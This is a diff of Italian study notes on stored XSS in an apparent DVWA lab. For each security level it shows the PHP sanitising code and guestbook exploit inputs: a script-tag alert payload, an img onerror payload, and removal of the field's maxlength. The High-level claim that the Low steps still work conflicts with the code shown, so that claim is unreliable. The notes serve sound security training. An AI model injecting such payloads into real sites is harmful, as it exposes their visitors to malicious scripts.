@@ -6,20 +6,57 @@
 - http://www.cgisecurity.com/xss-faq.html
 - http://www.scriptalert1.com/
 
-Si ha uno Stored XSS quando non viene fatta un'adeguata input validation sulle informazioni inserite dal client.
-Il numero di potenziali vittime cresce.
+Lo script malevolo viene memorizzato sul server obiettivo.
+Ogni volta che un utente visita la relativa pagina, riceve il codice e questo viene eseguito sul browser.
 
-Codice Vulnerabile:
+## XSS (Stored) - Low
 
 ```
-// Update database
-$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
-$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+// Sanitize message input
+$message = stripslashes( $message ); 
 ```
+
+stripslashes — Un-quotes a quoted string
 
 Exploit:
 
-Name*: `Frodo`
+- `Name *`: `Mallory`
+- `Message *`: `Here I am! <script>alert('hacked')</script>`
+- `Sign Guestbook`
 
-Message*: `To Mordor<script>alert('XSS')</script>`
+## XSS (Stored) - Medium
+
+```
+// Sanitize message input
+$message = strip_tags( addslashes( $message ) ); 
+
+...
+
+// Sanitize name input
+$name = str_replace( '<script>', '', $name ); 
+```
+
+strip_tags — Strip HTML and PHP tags from a string  
+addslashes — Quote string with slashes
+
+Exploit:
+
+- nell'html elimina l'attributo `maxlength` per il tag `<input name="txtName">`
+- `Name *`: `Mallory <img src="" style="display:none" onerror=alert('hacked')>`
+- `Message *`: `Here I am again!`
+- `Sign Guestbook`
+
+## XSS (Stored) - High
+
+```
+// Sanitize message input
+$message = strip_tags( addslashes( $message ) );
+
+...
+
+// Sanitize name input
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+```
+
+Exploit: stessi passi del livello Low
 
